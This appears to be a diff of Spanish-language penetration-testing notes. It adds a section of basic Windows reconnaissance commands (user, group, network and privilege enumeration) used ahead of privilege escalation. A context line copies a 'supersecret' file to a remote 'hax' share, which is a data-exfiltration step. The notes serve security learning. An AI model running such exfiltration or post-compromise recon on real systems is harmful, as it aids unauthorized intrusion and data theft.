@@ -1131,7 +1131,19 @@ copy C:\temp\supersecret.txt \\172.16.1.30\hax\supersecret.txt
 > https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
 
 
+## Recon basico windows
 
+
+Ahora para escalar vamos a hacer reconocimiento basico..
+
+```
+systeminfo
+net user
+net localgroup
+netstat -ano
+whoami /priv
+whoami /all #miembro de que grupos
+```
 
 
 
